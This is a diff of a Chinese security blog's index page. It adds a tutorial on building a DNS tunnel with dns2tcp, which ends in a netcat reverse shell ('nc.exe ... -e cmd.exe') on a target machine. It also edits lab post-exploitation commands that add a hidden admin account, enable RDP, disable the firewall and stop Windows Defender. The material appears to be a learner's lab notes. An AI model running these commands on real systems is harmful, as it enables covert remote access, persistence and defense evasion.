@@ -200,6 +200,139 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/06/DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/06/DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">DNS隧道搭建</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-08-06 16:00:51 / 修改时间：16:49:53" itemprop="dateCreated datePublished" datetime="2022-08-06T16:00:51+08:00">2022-08-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">1.内网横向</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/1-%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">1.流量代理</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/394756">https://developer.aliyun.com/article/394756</a></p>
+<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p><strong>购买域名</strong></p>
+<p>购买一个域名，这里以腾讯云域名作为示范</p>
+<p><a target="_blank" rel="noopener" href="https://buy.cloud.tencent.com/domain?from=console">https://buy.cloud.tencent.com/domain?from=console</a></p>
+<p>买一个.com大概50、60块，一个.work,.xyz等冷门域名，10几块就可以了。</p>
+<p><strong>环境准备</strong></p>
+<p>下载dns2tcp到云服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/alex-sector/dns2tcp</span><br></pre></td></tr></table></figure>
+
+<p>下载好后编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd dns2tcp</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>windows编译dns2tcp</p>
+<p>在对某些windows主机为目标进行渗透时，需要用.exe格式的dns2tcpc.exe客户端</p>
+<p>这一步暂未复现，参考网上一些教程失败了，先搁置，网上找了现成exe文件下载下来用，不放出链接，自行找资源，测毒。</p>
+<p>经过如上步骤后，云服务器上编译好的dns2tcp应该可以使用dns2tcpd命令，这是服务端</p>
+<p>windows上，把网上下载好的dns2tcpc.exe上传到靶机</p>
+<p><strong>配置域名解析</strong></p>
+<p>腾讯云使用的是DNSpod控制台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ns1.xxxxxx.com A 127.0.0.1 #添加一个A记录，ns1是A记录的名字，xxxxxx.com是你注册的域名，127.0.0.1是你的云服务器地址</span><br><span class="line">x1.xxxxxx.com NS ns1.xxxxxx.com #添加一个NS记录，x1是NS记录的名字，xxxxxx.com是你注册的域名，ns1.xxxxxx.com是A记录域名本身</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 概念解释</span><br><span class="line">A记录：域名指向IP</span><br><span class="line">NS记录：域名指向域名</span><br><span class="line"># 参考链接（这里解释的很清楚）：https://www.alibabacloud.com/help/zh/alidns-intl/latest/record-types</span><br></pre></td></tr></table></figure>
+
+<p>大概是这样的：</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208061628715.png" alt="image-20220806162845489"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最终是：</span><br><span class="line">x1.xxxxxx.com指向ns1.xxxxxx.com</span><br><span class="line">ns1.xxxxxx.com指向 云服务器IP</span><br></pre></td></tr></table></figure>
+
+<p>云服务器53端口记得在防火墙上开放</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208061646691.png" alt="image-20220806164628817"></p>
+<p><strong>工具使用</strong></p>
+<p>写配置文件，一般是写在&#x2F;etc&#x2F;dns2tcp.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">listen = 0.0.0.0</span><br><span class="line">port = 53</span><br><span class="line">user = root</span><br><span class="line">key = password</span><br><span class="line">chroot = /tmp/</span><br><span class="line">domain = x1.cethiik.com</span><br><span class="line">resources = ssh:127.0.0.1:22,socks:127.0.0.1:1088,other:127.0.0.1:7891,msf:127.0.0.1:7899,nc:127.0.0.1:4444</span><br></pre></td></tr></table></figure>
+
+<p>listen为监听地址，一般为所有</p>
+<p>Port为监听端口</p>
+<p>user为用户，暂时没用到，随便写</p>
+<p>key是连接密码，可以为空，客户连接时认证用</p>
+<p>chroot暂时没用到</p>
+<p>domain写ns记录的名字，本文中即：x1.xxxxxx.com</p>
+<p>resources写你要开的服务，所使用服务必须在这里注册，客户端连接时需要用到</p>
+<p>服务端命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpd -f /etc/dns2tcp.conf -F -d 3</span><br></pre></td></tr></table></figure>
+
+<p>客户端命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpc.exe -r nc -z x1.xxxxxx.com 127.0.0.1 -l 9098 -d 2</span><br></pre></td></tr></table></figure>
+
+<p>-r 是指定服务，即在服务端配置文件resources中注册过的服务名字</p>
+<p>-z 是指定NS记录名字</p>
+<p>127.0.0.1是云服务器IP</p>
+<p>-l 是指将指定服务绑定到本地哪个端口，随便写没被占用的即可</p>
+<p>-d 是开启debug</p>
+<p><strong>实例</strong></p>
+<p>服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpd -f /etc/dns2tcp.conf -F -d 3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpc.exe -r nc -z x1.xxxxxx.com 127.0.0.1 -l 9098 -d 2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe 127.0.0.1 4444 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/29/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -231,7 +364,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-31 17:23:35" itemprop="dateModified" datetime="2022-07-31T17:23:35+08:00">2022-07-31</time>
+                <time title="修改时间：2022-08-05 02:16:52" itemprop="dateModified" datetime="2022-08-05T02:16:52+08:00">2022-08-05</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -305,7 +438,7 @@
 <h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 当前用户</span><br><span class="line">whoami</span><br><span class="line"># 主机名</span><br><span class="line">hostname</span><br><span class="line"># 本机用户列表</span><br><span class="line">net user</span><br><span class="line"># 本地管理员组</span><br><span class="line">net localgroup administrator</span><br><span class="line"># 系统版本</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line"># 系统架构</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line"># 安装软件及版本</span><br><span class="line">wmic product get name,version</span><br><span class="line"># 进程与服务</span><br><span class="line">tasklist</span><br><span class="line"># IP查询，根据DNS判断是否在域环境</span><br><span class="line">ipconfig/all</span><br><span class="line"># 局域网内其他主机名</span><br><span class="line">net view</span><br><span class="line"># 查看域用户</span><br><span class="line">net view /domain</span><br><span class="line"># 查询计算机名 全名 用户名 系统版本 工作站 域 登录域</span><br><span class="line">net config workstation</span><br><span class="line"># 查看域控服务器</span><br><span class="line">nslookup god.org</span><br><span class="line"># 查看当前域下的所有用户 </span><br><span class="line">net user /domain # 若发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但当前登录用户不是域用户)</span><br><span class="line"># 获取域内用户信息</span><br><span class="line">wmic useraccount get /all</span><br><span class="line"># 查看域管理员的名字</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line"># 查看所有域成员计算机名</span><br><span class="line">net group &quot;domain computers&quot; /domain</span><br><span class="line"># 查看域管理员</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
 
 <p>渗透过程中可能用到的dos命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user hack hack123 /add</span><br><span class="line">net localgroup administrator hack /add</span><br><span class="line">net localgroup &quot;Remote Desktop Users&quot; hack /add</span><br><span class="line">开启3389；</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">netsh advfirewall set allprofiles state off        #关闭防火墙</span><br><span class="line">net stop windefend</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user hack hack123 /add</span><br><span class="line">net localgroup administrators hack /add</span><br><span class="line">net localgroup &quot;Remote Desktop Users&quot; hack /add</span><br><span class="line">开启3389；</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">netsh advfirewall set allprofiles state off        #关闭防火墙</span><br><span class="line">net stop windefend</span><br></pre></td></tr></table></figure>
 
 
       
@@ -1160,98 +1293,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/01/Nmap-%E6%89%B9%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/01/Nmap-%E6%89%B9%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" class="post-title-link" itemprop="url">Nmap:批量端口扫描</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-01 19:00:15" itemprop="dateCreated datePublished" datetime="2022-07-01T19:00:15+08:00">2022-07-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-24 00:08:40" itemprop="dateModified" datetime="2022-07-24T00:08:40+08:00">2022-07-24</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">1.工具总结</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">1.信息收集工具</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/120139192">https://blog.csdn.net/qq_45300786/article/details/120139192</a></p>
-<h3 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h3><p>在针对搜集到的大量IP地址进行端口扫描的场景下，可以使用以下命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sS -Pn --open -T4  -iL ip.txt -oX res.xml</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；</span><br><span class="line">-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；</span><br><span class="line">-n： 不解析域名，加快扫描速度</span><br><span class="line">–open： 只输出检测状态为open的端口，即开放的端口；</span><br><span class="line">-T4：总共有T0-T5，貌似T4比较折中</span><br><span class="line">-iL：载入ip段文件，批量扫，不用一条条执行了。</span><br><span class="line">-oX：结果另存在xxx.xml格式</span><br></pre></td></tr></table></figure>
-
-<p>下载完后会得到一个存放结果的xml文件，可以用自动化脚本处理这个文件，将它转换成我们熟悉的xls表格格式</p>
-<p>脚本下载地址</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/mrschyte/nmap-converter">https://github.com/mrschyte/nmap-converter</a></p>
-<p>脚本安装</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt		//windows安装它的第一个模块好像安装不成功，我使安装到了kali上</span><br></pre></td></tr></table></figure>
-
-<p>脚本使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 nmap-converter.py -o result.xls res.xml		//result.xls是最终结果，res.xml是nmap最初导出的结果文件</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1323,14 +1364,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -1367,7 +1408,7 @@
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共30.6k字</span>
+  <span class="post-count">博客全站共31.3k字</span>
 </div>
 
     <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
